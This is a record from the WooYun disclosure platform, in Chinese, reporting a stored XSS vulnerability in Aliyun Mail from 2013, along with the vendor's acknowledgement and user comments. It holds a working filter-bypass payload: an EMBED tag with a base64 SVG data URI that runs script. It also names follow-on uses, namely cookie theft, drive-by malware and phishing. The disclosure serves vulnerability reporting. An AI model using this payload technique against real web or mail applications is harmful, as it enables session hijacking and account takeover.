{"id": 8399, "wybug_id": "wooyun-2013-037870", "wybug_title": "阿里云邮箱存储型XSS漏洞", "wybug_corp": "阿里巴巴", "wybug_author": "Liuz5O69", "wybug_date": "2013-09-23 15:27", "wybug_open_date": "2013-11-07 15:28", "wybug_type": "xss跨站脚本攻击", "wybug_level": "中", "wybug_rank_0": "7", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["持久型", "存储型", "阿里云", "阿里云邮箱"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-09-23：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-09-23：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-10-03：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-10-13：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-10-23：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-11-07：\t细节向公众公开  简要描述： 阿里云邮箱邮件正文存在存储型跨站漏洞，可通过在HTML内嵌data uri scheme标记的方式来绕过执行恶意脚本。成功窃取信息可以登陆受攻击者邮箱，甚至阿里云用户中心（从雅虎邮箱迁移申请的aliyun邮箱登陆密码可同时登陆用户中心）。 详细说明：  该漏洞能够在除IE以外的FireFox,Opera,webkit内核浏览器,Safari下执行成功，通过发送邮件\n<EMBED SRC=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoJ2dvb2Qgam9iJyk7PC9zY3JpcHQ+PC9zdmc+\" AllowScriptAccess=\"always\"></EMBED>\n，base64部分解密为\n<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\"><script type=\"text/ecmascript\">alert('good job');</script></svg>\n，可以触发漏洞，如图：\n\n   漏洞证明：  通过更换base64部分编码的脚本可实施一些常规攻击（以下在Firefox下测试通过）：1 邮件挂马\n\n2 cookie及访问者信息窃取\n\n\n\n3 XSS phishing,URL保持不变刷伪造页面：\n\n刷写脚本：\n\n   修复方案：  过滤   版权声明：转载请注明来源 Liuz5O69@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2013-09-23 16:31 厂商回复： 感谢你对我们的支持与关注，该问题我们正在修复~~ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-09-23 17:05 |    \t\tMas \t\t\t( 实习白帽子  |\t\t\t        Rank:42 漏洞数:15        )\t\t \n  厂商回复：感谢你对我们的支持与关注，该问题我们正在修复~~    \n     2013-09-23 17:47 |    \t\tLeon \t\t\t( 路人 |\t\t\t        Rank:25 漏洞数:6        | 永无宁日啊)\t\t \n  my god  我是受害者。。。    \n     2013-09-23 18:08 |    \t\tLiuz5O69 \t\t\t( 实习白帽子  |\t\t\t        Rank:54 漏洞数:8        | 一个默默的学习者。)\t\t \n  @Leon ????你是正准备提交的吗    \n     2013-09-24 09:35 |    \t\tLeon \t\t\t( 路人 |\t\t\t        Rank:25 漏洞数:6        | 永无宁日啊)\t\t \n  @Liuz5O69   不是，，我用的他们邮箱。。。    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}